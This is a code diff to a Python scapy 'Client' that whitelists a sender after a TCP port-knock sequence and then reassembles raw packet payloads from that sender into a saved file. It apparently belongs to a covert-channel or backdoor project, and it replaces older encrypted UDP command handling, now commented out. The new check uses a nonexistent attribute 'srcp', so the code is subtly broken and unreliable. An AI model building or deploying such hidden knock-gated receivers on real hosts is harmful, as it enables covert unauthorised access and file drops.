@@ -3,7 +3,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
 from scapy.layers.dns import DNS, DNSQR
 from scapy.layers.inet import UDP, IP, TCP
-from scapy.all import sniff, send
+from scapy.all import sniff, send, Raw
 from scapy.volatile import RandShort
 from threading import Thread
 import yaml
@@ -27,6 +27,7 @@ class Client:
         self.cur_pos = 0
         self.filter = ""
         self.whitelist = []
+        self.file_bits = []
     def start(self):
         self.process_yaml()
         self.create_thread()
@@ -92,16 +93,42 @@ class Client:
             if packet[TCP].flags & 0x02 and packet[TCP].dport == self.sequence[self.cur_pos]:
                 self.cur_pos += 1
                 if self.cur_pos == len(self.sequence):
+                    print("Whitelisting a dude")
                     self.whitelist.append(packet[IP].src)
                     self.cur_pos = 0
-        try:
-            msg = packet[UDP].load.decode()
-            if UDP in packet and packet[UDP].dport == self.recv_port:
-                val = self.authenticate_packet(msg, packet)
-                if val:
-                    self.process_packets(val)
-        except:
-            return
+
+        # Packet with file processing
+
+        if IP in packet and packet[IP].srcp in self.whitelist:
+            if packet[IP].src in self.whitelist:
+                print(f"received data from whitelisted ip: {packet[IP].src}")
+                data = packet[Raw].load
+                self.file_bits.append(data)
+
+                if b'\x00' in data:
+                    print("Terminator received....")
+                    self.combine_bits()
+                    self.file_bits = []
+
+
+        #
+        # try:
+        #     msg = packet[UDP].load.decode()
+        #     if UDP in packet and packet[UDP].dport == self.recv_port:
+        #         val = self.authenticate_packet(msg, packet)
+        #         if val:
+        #             self.process_packets(val)
+        # except:
+        #     return
+    def combine_bits(self):
+        """Combines the stored data saves it as a file"""
+        data = b''.join(self.file_bits)
+        with open('test_file.txt', 'wb') as f:
+            f.write(data)
+        print("file saved")
+
+
+
 
     def authenticate_packet(self, data: str, packet) -> str:
         decrypted_msg = self.decrypt_data(data)
